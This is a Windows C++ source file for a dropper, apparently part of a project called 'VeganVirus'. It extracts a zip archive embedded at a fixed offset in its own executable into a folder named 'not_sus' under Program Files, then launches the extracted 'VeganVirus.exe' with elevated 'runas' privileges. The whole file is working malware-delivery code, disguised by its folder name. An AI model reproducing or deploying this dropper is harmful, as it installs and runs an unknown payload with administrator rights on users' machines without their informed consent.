#include <windows.h>
#include <stdio.h>
#include <iostream>
#include <Shldisp.h>
#include <atlbase.h>
#include <direct.h>
#include <shlobj_core.h>

#define WORK_DIRECTORY L"C:\\Program Files (x86)\\not_sus"
#define OUTPUT_FILE_NAME "C:\\Program Files (x86)\\not_sus\\output.zip"

#define ZIP_NAME L"\\output.zip"
#define EXECUTABLE_NAME L"\\VeganVirus.exe"

#define LENGTH 200
#define ZIP_LOCATION_IN_FILE 14848

// ignore unsafe wranings
#pragma warning(disable:4996)

bool UnzipToFolder(BSTR lpZipFile, BSTR lpFolder);

int main()
{
	// create folder in program files
	int a = SHCreateDirectoryExW(NULL, WORK_DIRECTORY, NULL);

	// get current path
	char currentPath[LENGTH] = { 0 };
	GetModuleFileNameA(NULL, currentPath, LENGTH);

	FILE* inputFile = fopen(currentPath, "rb");
	FILE* outputFile = fopen(OUTPUT_FILE_NAME, "wb");
	int ch;

	// move to zip's location in file
	fseek(inputFile, ZIP_LOCATION_IN_FILE, SEEK_SET);

	while ((ch = fgetc(inputFile)) != EOF)
	{
		fputc(ch, outputFile);
	}
	fclose(outputFile);
	fclose(inputFile);

	std::wstring path(WORK_DIRECTORY);
	std::wstring filePath = path + ZIP_NAME;

	// unzip file
	CComBSTR folder(path.c_str());
	CComBSTR file(filePath.c_str());
	UnzipToFolder(file, folder);

	// run the extracted exetuablePath
	ShellExecuteW(NULL, L"runas", (path + EXECUTABLE_NAME).c_str(), L"-l", NULL, SW_SHOWNORMAL);

	return 0;
}

// function unzips a .zip file
// input: zip file path and folder to extract to
// return: operation success
bool UnzipToFolder(BSTR lpZipFile, BSTR lpFolder)
{
	IShellDispatch* pISD;

	Folder* pZippedFile = 0L;
	Folder* pDestination = 0L;

	long FilesCount = 0;
	IDispatch* pItem = 0L;
	FolderItems* pFilesInside = 0L;

	VARIANT Options, OutFolder, InZipFile, Item;
	CoInitialize(NULL);
	__try
	{
		if (CoCreateInstance(CLSID_Shell, NULL, CLSCTX_INPROC_SERVER, IID_IShellDispatch, (void**)&pISD) != S_OK)
			return 1;

		InZipFile.vt = VT_BSTR;
		InZipFile.bstrVal = lpZipFile;
		pISD->NameSpace(InZipFile, &pZippedFile);
		if (!pZippedFile)
		{
			pISD->Release();
			return 1;
		}

		OutFolder.vt = VT_BSTR;
		OutFolder.bstrVal = lpFolder;
		pISD->NameSpace(OutFolder, &pDestination);
		if (!pDestination)
		{
			pZippedFile->Release();
			pISD->Release();
			return 1;
		}

		pZippedFile->Items(&pFilesInside);
		if (!pFilesInside)
		{
			pDestination->Release();
			pZippedFile->Release();
			pISD->Release();
			return 1;
		}

		pFilesInside->get_Count(&FilesCount);
		if (FilesCount < 1)
		{
			pFilesInside->Release();
			pDestination->Release();
			pZippedFile->Release();
			pISD->Release();
			return 0;
		}

		pFilesInside->QueryInterface(IID_IDispatch, (void**)&pItem);

		Item.vt = VT_DISPATCH;
		Item.pdispVal = pItem;

		Options.vt = VT_I4;
		Options.lVal = 1024 | 512 | 16 | 4;

		bool retval = pDestination->CopyHere(Item, Options) == S_OK;

		pItem->Release(); pItem = 0L;
		pFilesInside->Release(); pFilesInside = 0L;
		pDestination->Release(); pDestination = 0L;
		pZippedFile->Release(); pZippedFile = 0L;
		pISD->Release(); pISD = 0L;

		return retval;

	}
	__finally
	{
		CoUninitialize();
	}
}